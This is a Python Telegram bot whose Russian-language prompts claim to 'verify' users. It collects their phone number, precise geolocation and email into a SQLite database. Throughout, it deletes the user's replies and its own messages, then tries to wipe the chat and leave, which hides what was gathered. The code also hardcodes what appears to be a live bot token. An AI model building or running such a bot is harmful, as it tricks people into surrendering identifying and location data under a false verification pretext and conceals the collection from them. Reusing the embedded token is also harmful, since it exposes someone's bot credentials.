import telebot
from telebot import types
import sqlite3
from datetime import datetime
import time

bot = telebot.TeleBot('7993865098:AAFGjVty7eEJW8pavSqxjzYXsfuCnlIyt98')

# Инициализация базы данных
conn = sqlite3.connect('user_data.db', check_same_thread=False)
cursor = conn.cursor()

# Создание таблицы
cursor.execute('''
CREATE TABLE IF NOT EXISTS users (
    user_id INTEGER PRIMARY KEY,
    first_name TEXT,
    last_name TEXT,
    username TEXT,
    phone TEXT,
    email TEXT,
    latitude REAL,
    longitude REAL,
    registration_date TEXT,
    last_bot_message_id INTEGER
)
''')
conn.commit()

# Функция для удаления сообщений
def delete_messages(chat_id, *message_ids):
    for msg_id in message_ids:
        try:
            bot.delete_message(chat_id, msg_id)
            time.sleep(0.3)  # Задержка для избежания ограничений API
        except Exception as e:
            print(f"Не удалось удалить сообщение {msg_id}: {e}")

@bot.message_handler(commands=['start'])
def start(message):
    # Удаляем команду /start
    try:
        bot.delete_message(message.chat.id, message.message_id)
    except:
        pass
    
    # Проверяем, есть ли пользователь уже в базе
    cursor.execute('SELECT phone FROM users WHERE user_id = ?', (message.from_user.id,))
    result = cursor.fetchone()
    
    if result and result[0]:  # Если номер уже есть
        msg = bot.send_message(message.chat.id, "Вы уже зарегистрированы!")
        ask_location(message)
        # Сохраняем ID сообщения бота
        cursor.execute('UPDATE users SET last_bot_message_id = ? WHERE user_id = ?', 
                      (msg.message_id, message.from_user.id))
        conn.commit()
    else:
        # Запрашиваем контакт
        markup = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
        markup.add(types.KeyboardButton("📱 Поделиться контактом", request_contact=True))
        
        msg = bot.send_message(
            message.chat.id,
            "👋 Для прохождения верификации необходимо поделиться контактом.\n\n"
            "Нажмите кнопку ниже ⬇️",
            reply_markup=markup
        )
        # Сохраняем ID сообщения бота
        cursor.execute('INSERT OR REPLACE INTO users (user_id, last_bot_message_id) VALUES (?, ?)',
                      (message.from_user.id, msg.message_id))
        conn.commit()

@bot.message_handler(content_types=['contact'])
def handle_contact(message):
    # Удаляем сообщение с контактом
    try:
        bot.delete_message(message.chat.id, message.message_id)
    except:
        pass
    
    if message.contact.user_id == message.from_user.id:
        # Удаляем предыдущее сообщение бота
        cursor.execute('SELECT last_bot_message_id FROM users WHERE user_id = ?', (message.from_user.id,))
        last_bot_msg_id = cursor.fetchone()[0]
        if last_bot_msg_id:
            try:
                bot.delete_message(message.chat.id, last_bot_msg_id)
            except:
                pass
        
        # Сохраняем контактные данные
        user = message.from_user
        cursor.execute('''
        INSERT OR REPLACE INTO users 
        (user_id, first_name, last_name, username, phone, registration_date)
        VALUES (?, ?, ?, ?, ?, ?)
        ''', (
            user.id,
            user.first_name,
            user.last_name,
            user.username,
            message.contact.phone_number,
            datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        ))
        conn.commit()
        
        msg = bot.send_message(
            message.chat.id,
            "✅ Контакт сохранен!",
            reply_markup=types.ReplyKeyboardRemove()
        )
        # Обновляем ID последнего сообщения бота
        cursor.execute('UPDATE users SET last_bot_message_id = ? WHERE user_id = ?',
                      (msg.message_id, message.from_user.id))
        conn.commit()
        
        # Запрашиваем геопозицию
        ask_location(message)
    else:
        msg = bot.send_message(message.chat.id, "❌ Пожалуйста, поделитесь СВОИМ контактом.")
        cursor.execute('UPDATE users SET last_bot_message_id = ? WHERE user_id = ?',
                      (msg.message_id, message.from_user.id))
        conn.commit()

def ask_location(message):
    # Удаляем предыдущее сообщение бота
    cursor.execute('SELECT last_bot_message_id FROM users WHERE user_id = ?', (message.from_user.id,))
    last_bot_msg_id = cursor.fetchone()[0]
    if last_bot_msg_id:
        try:
            bot.delete_message(message.chat.id, last_bot_msg_id)
        except:
            pass
    
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
    markup.add(types.KeyboardButton("📍 Поделиться местоположением", request_location=True))
    
    msg = bot.send_message(
        message.chat.id,
        "Пожалуйста, поделитесь вашим местоположением:",
        reply_markup=markup
    )
    cursor.execute('UPDATE users SET last_bot_message_id = ? WHERE user_id = ?',
                  (msg.message_id, message.from_user.id))
    conn.commit()

@bot.message_handler(content_types=['location'])
def handle_location(message):
    # Удаляем сообщение с локацией
    try:
        bot.delete_message(message.chat.id, message.message_id)
    except:
        pass
    
    # Удаляем предыдущее сообщение бота
    cursor.execute('SELECT last_bot_message_id FROM users WHERE user_id = ?', (message.from_user.id,))
    last_bot_msg_id = cursor.fetchone()[0]
    if last_bot_msg_id:
        try:
            bot.delete_message(message.chat.id, last_bot_msg_id)
        except:
            pass
    
    if message.location:
        # Сохраняем координаты
        cursor.execute('''
        UPDATE users 
        SET latitude = ?, longitude = ?
        WHERE user_id = ?
        ''', (
            message.location.latitude,
            message.location.longitude,
            message.from_user.id
        ))
        conn.commit()
        
        # Запрашиваем email
        ask_email(message)
    else:
        msg = bot.send_message(message.chat.id, "❌ Не удалось получить ваше местоположение.")
        cursor.execute('UPDATE users SET last_bot_message_id = ? WHERE user_id = ?',
                      (msg.message_id, message.from_user.id))
        conn.commit()

def ask_email(message):
    # Удаляем предыдущее сообщение бота
    cursor.execute('SELECT last_bot_message_id FROM users WHERE user_id = ?', (message.from_user.id,))
    last_bot_msg_id = cursor.fetchone()[0]
    if last_bot_msg_id:
        try:
            bot.delete_message(message.chat.id, last_bot_msg_id)
        except:
            pass
    
    msg = bot.send_message(
        message.chat.id,
        "📧 Пожалуйста, введите ваш email:",
        reply_markup=types.ForceReply(selective=True)
    )
    cursor.execute('UPDATE users SET last_bot_message_id = ? WHERE user_id = ?',
                  (msg.message_id, message.from_user.id))
    conn.commit()
    
    # Регистрируем следующий шаг для обработки email
    bot.register_next_step_handler(msg, process_email)

def process_email(message):
    # Удаляем сообщение с email
    try:
        bot.delete_message(message.chat.id, message.message_id)
    except:
        pass
    
    # Удаляем предыдущее сообщение бота
    cursor.execute('SELECT last_bot_message_id FROM users WHERE user_id = ?', (message.from_user.id,))
    last_bot_msg_id = cursor.fetchone()[0]
    if last_bot_msg_id:
        try:
            bot.delete_message(message.chat.id, last_bot_msg_id)
        except:
            pass
    
    email = message.text.strip()
    
    # Простая валидация email
    if '@' in email and '.' in email:
        # Сохраняем email
        cursor.execute('''
        UPDATE users 
        SET email = ?
        WHERE user_id = ?
        ''', (email, message.from_user.id))
        conn.commit()
        
        # Отправляем финальное сообщение
        msg = bot.send_message(
            message.chat.id,
            "Все данные сохранены.\n\n"
            "Вы прошли верификацию!",
            reply_markup=types.ReplyKeyboardRemove()
        )
        
        # Удаляем чат через 5 секунд
        time.sleep(0)
        delete_chat(message.chat.id)
    else:
        msg = bot.send_message(
            message.chat.id,
            "❌ Неверный формат email. Пожалуйста, введите корректный email:",
            reply_markup=types.ForceReply(selective=True)
        )
        cursor.execute('UPDATE users SET last_bot_message_id = ? WHERE user_id = ?',
                      (msg.message_id, message.from_user.id))
        conn.commit()
        bot.register_next_step_handler(msg, process_email)  # Повторно запрашиваем email

def delete_chat(chat_id):
    try:
        # Пытаемся удалить все сообщения
        for i in range(1, 100):
            try:
                bot.delete_message(chat_id, i)
                time.sleep(0.3)
            except:
                continue
        
        # Пытаемся покинуть чат
        bot.leave_chat(chat_id)
    except Exception as e:
        print(f"Ошибка при удалении чата: {e}")

bot.polling()